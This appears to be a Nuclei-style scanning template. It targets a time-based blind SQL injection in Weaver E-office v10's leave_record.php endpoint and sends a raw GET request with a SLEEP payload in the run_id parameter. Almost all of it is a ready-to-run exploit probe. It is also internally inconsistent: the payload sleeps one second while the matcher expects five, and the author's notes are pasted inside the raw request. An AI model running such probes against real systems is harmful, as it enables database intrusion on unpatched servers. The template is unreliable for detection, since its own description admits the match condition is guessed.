id: poc-tm3h5y7s46n7dbup
info:
  name: 泛微 E-office v10 leave_record.php 存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2024
http:
- raw:
  - 'GET /eoffice10/server/ext/system_support/leave_record.php?flow_id=1&run_id=1'')+AND+(SELECT+5897+FROM+(SELECT(SLEEP(1)))QWhi)%23&table_field=1&table_field_name=user()&max_rows=10 HTTP/1.1


    # 响应代码特征

    200


    # 响应内容特征

    ^(?=.*?user())(?=.*?未找到相关数据).*?$


    # 上传文件定位

    暂无'
  redirects: false
  matchers:
  - type: dsl
    dsl:
    - status_code == 200 && duration >= 5
    condition: and
